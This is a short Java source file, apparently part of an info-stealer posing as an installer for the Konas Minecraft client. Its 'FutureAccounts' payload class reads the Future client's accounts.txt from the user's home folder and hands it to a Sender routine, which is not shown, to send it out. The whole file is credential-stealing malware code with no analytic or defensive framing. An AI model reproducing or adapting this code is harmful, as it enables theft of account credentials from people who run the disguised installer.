package konas.installer.payload.impl;

/**
 *
 * @author ThnksCJ
 */

import konas.installer.payload.Payload;
import konas.installer.payload.Sender;
import konas.installer.util.FileUtil;

import java.io.File;
import java.util.Optional;

public final class FutureAccounts implements Payload
{
    @Override
    public void execute()
    {
        Optional<File> file = FileUtil.getFile(System.getProperty("user.home") + "\\Future\\accounts.txt");
        file.ifPresent(Sender::send);
    }
}
